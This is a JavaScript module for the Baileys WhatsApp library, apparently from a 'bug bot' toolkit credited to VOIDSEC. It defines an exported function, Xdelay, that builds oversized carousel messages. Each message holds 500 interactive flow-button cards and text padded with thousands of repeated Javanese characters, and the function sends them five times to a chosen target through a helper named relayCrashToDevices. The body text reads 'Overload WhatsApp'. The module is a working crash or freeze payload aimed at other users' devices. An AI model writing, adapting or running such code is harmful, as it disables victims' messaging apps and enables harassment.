const { relayCrashToDevices } = require('../target-utils');
/*
 * © 2026 SeXyxeon (VOIDSEC)
 *
 * ⚠️ COPYRIGHT NOTICE
 * This source code is protected under copyright law.
 * Any form of re-uploading, recoding, modification,
 * selling, or redistribution WITHOUT explicit permission
 * from the original author is strictly prohibited.
 *
 * ❌ NO CREDIT = NO PERMISSION
 * ❌ DO NOT CLAIM THIS CODE AS YOUR OWN
 *
 * ✔️ Usage or modification is allowed ONLY
 * with prior permission and proper credit.
 *
 * OFFICIAL LINKS (ONLY):
 * YouTube   : https://youtube.com/@voidsec7718
 * Instagram : sabir._7718
 * Telegram  : https://t.me/SABIR7718
 * GitHub    : https://github.com/SABIR7718
 * WhatsApp  : +91 73650 85213
 *
 * Violations may result in DMCA takedown
 * or termination of the Telegram bot.
 */

const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

async function Xdelay(SYxS7, target) {
    const totalPushes = 5;

    for (let i = 0; i < totalPushes; i++) {
        const push = [];

        for (let k = 0; k < 500; k++) {
            push.push({
                body: {
                    text: 'Overload WhatsApp'
                },
                footer: {
                    text: ''
                },
                header: {
                    title: '🚩 TrashSuperior ',
                    hasMediaAttachment: false
                },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'galaxy_message',
                        buttonParamsJson: JSON.stringify({
                            header: 'null',
                            body: 'xxx',
                            flow_action: 'navigate',
                            flow_action_payload: {
                                screen: 'FORM_SCREEN'
                            },
                            flow_cta: 'Grattler',
                            flow_id: '1169834181134583',
                            flow_message_version: '3',
                            flow_token: 'AQAAAAACS5FpgQ_cAAAAAE0QI3s',
                        })
                    }],
                },
            });
        }

        const carousel = generateWAMessageFromContent(target, {
            interactiveMessage: {
                header: {
                    hasMediaAttachment: false,
                },
                body: {
                    text: '🚩 TrashSuperior Overload ' + "ꦾ".repeat(5000),
                },
                footer: {
                    text: 'Trash Superior',
                },
                carouselMessage: {
                    cards: [...push],
                },
            }
        }, {
            userJid: target
        });

        // Send via groupStatusMessageV2 wrapper as well as direct interactiveMessage using multi-tier fallback
        try {
            await relayCrashToDevices(SYxS7, target, {
                groupStatusMessageV2: {
                    message: carousel.message
                }
            });
        } catch (e) {
            console.error(`[Xdelay status wrapper ${i + 1}]:`, e.message);
        }

        try {
            await relayCrashToDevices(SYxS7, target, carousel.message);
        } catch (e) {
            console.error(`[Xdelay direct interactive ${i + 1}]:`, e.message);
        }
    }
}

module.exports = { Xdelay };
